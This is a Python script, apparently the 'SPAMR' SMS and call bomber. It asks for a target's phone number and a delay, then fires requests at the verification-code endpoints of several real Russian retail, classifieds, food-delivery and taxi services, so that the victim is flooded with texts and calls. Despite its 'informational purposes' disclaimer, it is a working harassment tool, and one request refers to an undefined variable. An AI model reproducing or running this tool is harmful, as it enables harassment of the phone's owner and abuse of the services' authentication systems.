# Импорты:
# Импорты:


import os
import random
import time
import requests
from termcolor import colored                
from getch import pause


# Дефы:
# Дефы:


def connected_to_internet(url='http://www.google.com/', timeout=5):
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        logo()
        print("\u001b[33m[!] \u001b[31mNo internet connection available.\033[0m\n")
        time.sleep(2)
        os.system("python spamr.py")
    return False

def delay():
    time.sleep(_delay)

def logo():
    os.system("clear")
    print("\u001b[33m       ____  ____   _    __  __ ____      ")
    print("\u001b[33m      / ___||  _ \ / \  |  \/  |  _ \     ")
    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")     
    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")    
    print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
    print("\u001b[33m                   v0.3.1                  ")
    print("\u001b[33m                                          ")
    print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z \u001b[32mto exit   ")
    print("                                                    ")        

def clear():
    os.system("clear")


# Начало кода:
# Начало кода:

_phone = "0"
_delay = "0"

logo()
print("\u001b[41m\u001b[32mMENU\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m UPDATE SPAMR.\n\u001b[33m[3]\u001b[32m ABOUT.\n")
menu = input("\u001b[33mEnter your choice: \033[0m")

if menu == "1" or menu == "2" or menu == "3":
    pass
else:
    os.system("python spamr.py")
if menu == "2":
    clear()
    connected_to_internet()
    os.system("cd && cd spamr && python update_module.py")

if menu == "3":
    logo()
    print("\u001b[33mINFO:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.1\u001b[33m\nCONTACTS:\n\u001b[34m  Telegram:\u001b[95m @BradToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mThis program was created for informational purposes ONLY!\nThe creator of this program does not bear ANY responsibility for your actions!\n\u001b[32mThanks Google Translate.\n\033[0m ")

    pause()
    os.system("python spamr.py")

if menu == "1":
    logo()
    connected_to_internet()
    _phone = input("\u001b[31mEnter number:\033[0m ")

    if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
        pass
    else:
        logo()
        print("\u001b[33m[!] \u001b[31mIncorrect number!\033[0m")
        time.sleep(2)
        os.system("python spamr.py")

if menu == "1":
    _delay = int(input("\u001b[31mEnter delay:\033[0m "))
    logo()

a  = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
delay()

a = requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
delay()

a = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
delay()

a = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone})
print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
delay()

a = requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
delay()




exit()


